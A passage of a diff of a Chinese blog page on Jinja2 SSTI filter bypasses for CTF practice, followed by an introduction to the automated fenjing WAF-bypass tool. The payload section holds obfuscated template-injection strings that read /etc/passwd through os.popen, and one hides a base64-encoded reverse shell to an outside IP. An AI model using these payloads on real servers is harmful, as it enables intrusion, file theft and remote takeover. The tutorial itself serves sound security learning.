+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">g</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">][</span><span class="s1">&#39;__glob&#39;</span><span class="o">+</span><span class="s1">&#39;als__&#39;</span><span class="p">][</span><span class="s1">&#39;__buil&#39;</span><span class="o">+</span><span class="s1">&#39;tins__&#39;</span><span class="p">][</span><span class="s1">&#39;__imp&#39;</span><span class="o">+</span><span class="s1">&#39;ort__&#39;</span><span class="p">](</span><span class="s1">&#39;o&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">)[</span><span class="s1">&#39;po&#39;</span><span class="o">+</span><span class="s1">&#39;pen&#39;</span><span class="p">](</span><span class="s1">&#39;ls&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;appli&#39;</span><span class="o">+</span><span class="s1">&#39;cation&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">glo&#39;</span><span class="o">+</span><span class="s1">&#39;bals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">get&#39;</span><span class="o">+</span><span class="s1">&#39;item</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">buil&#39;</span><span class="o">+</span><span class="s1">&#39;tins</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">get&#39;</span><span class="o">+</span><span class="s1">&#39;item</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">imp&#39;</span><span class="o">+</span><span class="s1">&#39;ort</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;o&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;pop&#39;</span><span class="o">+</span><span class="s1">&#39;en&#39;</span><span class="p">)(</span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;re&#39;</span><span class="o">+</span><span class="s1">&#39;ad&#39;</span><span class="p">)()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">还有收集的</span><span class="n">wp的payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{((</span><span class="n">sbwaf</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__eq__&#39;</span><span class="p">))[</span><span class="s1">&#39;__g&#39;&#39;lobals__&#39;</span><span class="p">][</span><span class="s1">&#39;s&#39;&#39;ys&#39;</span><span class="p">][</span><span class="s1">&#39;modules&#39;</span><span class="p">][</span><span class="s1">&#39;o&#39;&#39;s&#39;</span><span class="p">][</span><span class="s1">&#39;po&#39;&#39;pen&#39;</span><span class="p">](</span><span class="s1">&#39;bash${IFS}-c${IFS}</span><span class="se">\&#39;</span><span class="s1">{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAxLjIwMS43OS4yMDgvODg4OCAwPiYx}|{base64,-d}|{bash,-i}</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">))[</span><span class="s1">&#39;read&#39;</span><span class="p">]()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​</p>
+<hr>
+<h2 id="ssti终极工具fenjing">SSTI终极工具——fenjing
+</h2><p>​    全自动化绕过，只需要直接执行命令即可（仅支持http）</p>
+<p><img src="/p/ssti/27ecd0692fb24fdcabafb8317a92d02f.png"
+	width="1052"
+	height="584"
+	srcset="/p/ssti/27ecd0692fb24fdcabafb8317a92d02f_hu16366747395911202664.png 480w, /p/ssti/27ecd0692fb24fdcabafb8317a92d02f_hu12811531515910410430.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="180"
+		data-flex-basis="432px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​    kali中安装</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pip</span> <span class="n">install</span> <span class="n">fenjing</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​    使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">fenjing</span> <span class="n">scan</span> <span class="o">--</span><span class="n">url</span> <span class="s1">&#39;http://...&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">打开网站ui</span>
+</span></span><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">fenjing</span> <span class="n">webui</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​    讲的比较简单建议看下方文章</p>
+<p>​    <a class="link" href="https://www.ddosi.org/fenjing/#%e8%af%a6%e7%bb%86%e4%bd%bf%e7%94%a8"  target="_blank" rel="noopener"
+    >Fenjing 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 - 🔰雨苁ℒ🔰</a></p>
+<p>​    不过工具归工具，还是要有一些硬实力的，也遇到过fenjing找不出漏洞点的情况</p>
+<hr>
+<h2 id="小结">小结
+</h2><p>​    忙前忙后总算写完了这篇博客，还有很多绕过姿势没讲，不过有了fenjing，更加难的绕过应该都能迎刃而解</p>
+
 </section>
 
 
@@ -352,6 +1253,80 @@
     
 
     
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">渗透知识点汇总</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/awdawdp%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">AWD|AWDP从零到一</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E8%87%AA%E4%B8%BB%E7%A0%94%E7%A9%B6%E6%96%B0%E5%8F%91%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">自主研究新发现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/nodejs/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NodeJS</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/sql%E6%B3%A8%E5%85%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
 
      
     
@@ -404,7 +1379,9 @@
     <section class="copyright">
         &copy; 
         
-        2025 liernian
+            2025 - 
+        
+        2026 liernian
     </section>
     
     <section class="powerby">
@@ -498,7 +1475,7 @@
                 src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                 
                 >
-            </script><script type="text/javascript" src="/ts/main.a8a6a9bd7411f21e250a1b8e9266c2f71588e0431c070ef69a01c38182dc8052.js" defer></script>
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
 <script>
     (function () {
         const customFont = document.createElement('link');
